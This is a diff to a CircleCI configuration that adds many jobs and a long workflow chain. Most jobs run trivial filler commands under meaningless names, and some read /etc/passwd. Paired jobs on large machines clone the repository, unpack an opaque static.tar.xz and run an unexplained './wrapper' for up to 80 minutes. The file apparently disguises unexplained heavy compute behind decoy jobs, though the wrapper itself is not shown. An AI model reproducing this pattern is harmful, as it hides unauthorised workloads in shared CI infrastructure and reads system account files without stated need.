+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++)for(j=1;j<=50;j++)s++;print s}'; true ; } > /tmp/x/phase-9.out
+            echo "stage:assemble-quick-release-candidate:ok:$(wc -c </tmp/x/phase-9.out)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - phase-9.out
+  assemble-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/phase-9.out 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  reset_Prepare_Pipeline8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: e2e
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello"; print index(s,"ll")}'; true ; } > /tmp/x/phase-3.out
+            echo "stage:Prepare_Pipeline8:ok:$(wc -c </tmp/x/phase-3.out)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - phase-3.out
+  Prepare_Pipeline8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/phase-3.out 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+  g1_feat-862:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: dropped frame
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; echo 'banana apple apricot' | grep -o 'a' | wc -l; true ; } > /tmp/x/xa.pkg
+            echo "stage:feat-862:ok:$(wc -c </tmp/x/xa.pkg)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - xa.pkg
+  feat-862:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: Load stage 4
+          command: |
+            sed '/^$/d' /tmp/x/xa.pkg 2>/dev/null | wc -l || true
+      - run:
+          name: Clone project
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xzcat static.tar.xz | tar xvf -
+      - run:
+          no_output_timeout: 80m
+          command: "./wrapper"
+
+  round2_d-new_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: whipping end
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; sed -e 's/[^:]*:[^:]*/REDACTED/' /etc/passwd | head -3; true ; } > /tmp/x/stage4.data
+            echo "stage:d-new:ok:$(wc -c </tmp/x/stage4.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - stage4.data
+  prep_QA_VERIFY_8_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: dawn patrol
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 228490 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/x/stage1.data
+            echo "stage:QA_VERIFY_8:ok:$(wc -c </tmp/x/stage1.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - stage1.data
+  B_assemble-quick-release-candidate_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: chase bolt
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; echo $(($(date +%N) / 1000000)); true ; } > /tmp/x/phase-9.out
+            echo "stage:assemble-quick-release-candidate:ok:$(wc -c </tmp/x/phase-9.out)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - phase-9.out
+  tester_omar-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: potluck
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 1 100 | tr '\n' ','  | sed 's/,$/\n/' | head -c 60; true ; } > /tmp/x/step-9.log
+            echo "stage:omar-run:ok:$(wc -c </tmp/x/step-9.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - step-9.log
+  retry_deploy_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: plasma arc
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; grep -c "^processor" /proc/cpuinfo; true ; } > /tmp/x/data-C.bin
+            echo "stage:deploy:ok:$(wc -c </tmp/x/data-C.bin)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - data-C.bin
+  phase1_send-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: run
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; cat /proc/sys/kernel/pid_max 2>/dev/null; true ; } > /tmp/x/blob1
+            echo "stage:send-it:ok:$(wc -c </tmp/x/blob1)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - blob1
+  spinner_feat-862_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: no fail
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 1 10 | tac | awk '{print NR, $0}'; true ; } > /tmp/x/xa.pkg
+            echo "stage:feat-862:ok:$(wc -c </tmp/x/xa.pkg)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - xa.pkg
+  ensure_package_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: blue screen
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | wc -l; true ; } > /tmp/x/build-04.log
+            echo "stage:package:ok:$(wc -c </tmp/x/build-04.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - build-04.log
+  fixture_quebec-8_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: snack time
+          command: |
+            mkdir -p /tmp/x
+            set +o pipefail 2>/dev/null; seq 1 1404470 | awk '{print $1,int($1/10)}' | sort -k2n -k1n | head -n 10000 > /tmp/x/GATE.out; true
+            echo "stage:quebec-8:ok:$(wc -c </tmp/x/GATE.out)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - GATE.out
+  go_UAT_STAGE_7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: decrescendo
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=2;i<=200;i++){isp=1;for(j=2;j*j<=i;j++)if(i%j==0){isp=0;break}; if(isp)c++} print c}'; true ; } > /tmp/x/work-05.data
+            echo "stage:UAT_STAGE_7:ok:$(wc -c </tmp/x/work-05.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - work-05.data
+  alpha_defualt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: variation
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; seq 1 1000 | awk 'NR%3==0' | wc -l; true ; } > /tmp/x/yellow.data
+            echo "stage:defualt:ok:$(wc -c </tmp/x/yellow.data)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - yellow.data
+  step1_DEV_DEPLOY_1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: back road
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; echo $(( RANDOM + RANDOM )) | md5sum; true ; } > /tmp/x/newest.log
+            echo "stage:DEV_DEPLOY_1:ok:$(wc -c </tmp/x/newest.log)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - newest.log
+  postbuild_q4-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x
+      - run:
+          name: double rap
+          command: |
+            mkdir -p /tmp/x
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=0; for(i=1;i<=4;i++)for(j=1;j<=4;j++)for(k=1;k<=4;k++)s++; print s}'; true ; } > /tmp/x/computation.out
+            echo "stage:q4-rev:ok:$(wc -c </tmp/x/computation.out)"
+      - persist_to_workspace:
+          root: /tmp/x
+          paths:
+            - computation.out
+workflows:
+  build-and-test:
+    jobs:
+      - round1_DEPLOY_DEV
+      - DEPLOY_DEV:
+          requires:
+            - round1_DEPLOY_DEV
+      - red_LAB_CHECK_1:
+          requires:
+            - round1_DEPLOY_DEV
+      - LAB_CHECK_1:
+          requires:
+            - red_LAB_CHECK_1
+      - step2_DATA-697:
+          requires:
+            - red_LAB_CHECK_1
+      - DATA-697:
+          requires:
+            - step2_DATA-697
+      - cook_ed-push:
+          requires:
+            - step2_DATA-697
+      - ed-push:
+          requires:
+            - cook_ed-push
+      - green_rm-webhook:
+          requires:
+            - cook_ed-push
+      - rm-webhook:
+          requires:
+            - green_rm-webhook
+      - run_xray:
+          requires:
+            - green_rm-webhook
+      - xray:
+          requires:
+            - run_xray
+      - db_promote:
+          requires:
+            - run_xray
+      - promote:
+          requires:
+            - db_promote
+      - bake_hotfix-4079:
+          requires:
+            - db_promote
+      - hotfix-4079:
+          requires:
+            - bake_hotfix-4079
+      - prefetch_cf-alt:
+          requires:
+            - bake_hotfix-4079
+      - cf-alt:
+          requires:
+            - prefetch_cf-alt
+      - stage_d-old:
+          requires:
+            - prefetch_cf-alt
+      - d-old:
+          requires:
+            - stage_d-old
+      - ctx2_py310-bench:
+          requires:
+            - stage_d-old
+      - py310-bench:
+          requires:
+            - ctx2_py310-bench
+      - red_node18-cov:
+          requires:
+            - ctx2_py310-bench
+      - node18-cov:
+          requires:
+            - red_node18-cov
+      - vendor_bravo:
+          requires:
+            - red_node18-cov
+      - bravo:
+          requires:
+            - vendor_bravo
+      - canary_rust-lint:
+          requires:
+            - vendor_bravo
+      - rust-lint:
+          requires:
+            - canary_rust-lint
+      - blue_green-light-go:
+          requires:
+            - canary_rust-lint
+      - green-light-go:
+          requires:
+            - blue_green-light-go
+      - reset_Prepare_Pipeline8:
+          requires:
+            - blue_green-light-go
+      - Prepare_Pipeline8:
+          requires:
+            - reset_Prepare_Pipeline8
+      - reset_artifacts:
+          requires:
+            - reset_Prepare_Pipeline8
+      - artifacts:
+          requires:
+            - reset_artifacts
+      - preinit_d-new
+      - round2_d-new_2:
+          requires:
+            - preinit_d-new
+      - d-new:
+          requires:
+            - round2_d-new_2
+      - ctx_QA_VERIFY_8:
+          requires:
+            - round2_d-new_2
+      - prep_QA_VERIFY_8_2:
+          requires:
+            - ctx_QA_VERIFY_8
+      - QA_VERIFY_8:
+          requires:
+            - prep_QA_VERIFY_8_2
+      - spin_assemble-quick-release-candidate:
+          requires:
+            - prep_QA_VERIFY_8_2
+      - B_assemble-quick-release-candidate_2:
+          requires:
+            - spin_assemble-quick-release-candidate
+      - assemble-quick-release-candidate:
+          requires:
+            - B_assemble-quick-release-candidate_2
+      - warmup_omar-run:
+          requires:
+            - B_assemble-quick-release-candidate_2
+      - tester_omar-run_2:
+          requires:
+            - warmup_omar-run
+      - omar-run:
+          requires:
+            - tester_omar-run_2
+      - beta_deploy:
+          requires:
+            - tester_omar-run_2
+      - retry_deploy_2:
+          requires:
+            - beta_deploy
+      - deploy:
+          requires:
+            - retry_deploy_2
+      - prep_send-it:
+          requires:
+            - retry_deploy_2
+      - phase1_send-it_2:
+          requires:
+            - prep_send-it
+      - send-it:
+          requires:
+            - phase1_send-it_2
+      - g1_feat-862:
+          requires:
+            - phase1_send-it_2
+      - spinner_feat-862_2:
+          requires:
+            - g1_feat-862
+      - feat-862:
+          requires:
+            - spinner_feat-862_2
+      - beta_package:
+          requires:
+            - spinner_feat-862_2
+      - ensure_package_2:
+          requires:
+            - beta_package
+      - package:
+          requires:
+            - ensure_package_2
+      - round2_quebec-8:
+          requires:
+            - ensure_package_2
+      - fixture_quebec-8_2:
+          requires:
+            - round2_quebec-8
+      - quebec-8:
+          requires:
+            - fixture_quebec-8_2
+      - stepB_UAT_STAGE_7:
+          requires:
+            - fixture_quebec-8_2
+      - go_UAT_STAGE_7_2:
+          requires:
+            - stepB_UAT_STAGE_7
+      - UAT_STAGE_7:
+          requires:
+            - go_UAT_STAGE_7_2
+      - bootstrap_defualt:
+          requires:
+            - go_UAT_STAGE_7_2
+      - alpha_defualt_2:
+          requires:
+            - bootstrap_defualt
+      - defualt:
+          requires:
+            - alpha_defualt_2
+      - generate_DEV_DEPLOY_1:
+          requires:
+            - alpha_defualt_2
+      - step1_DEV_DEPLOY_1_2:
+          requires:
+            - generate_DEV_DEPLOY_1
+      - DEV_DEPLOY_1:
+          requires:
+            - step1_DEV_DEPLOY_1_2
+      - loader_q4-rev:
+          requires:
+            - step1_DEV_DEPLOY_1_2
+      - postbuild_q4-rev_2:
+          requires:
+            - loader_q4-rev
+      - q4-rev:
+          requires:
+            - postbuild_q4-rev_2
